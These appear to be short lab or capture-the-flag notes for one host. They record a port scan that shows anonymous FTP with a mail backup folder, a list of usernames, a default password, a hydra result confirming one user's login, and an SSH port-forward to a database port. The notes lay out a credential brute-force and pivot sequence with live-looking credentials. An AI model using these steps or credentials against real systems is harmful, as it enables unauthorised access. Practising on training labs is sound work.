
10.129.1.73

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

---

users:
optimus
albert
andreas
christine
maria

password:
funnel123#!#

---

hydra:
login: christine
password: funnel123#!#

---



ssh -L 12345:localhost:5432 christine@10.129.1.73
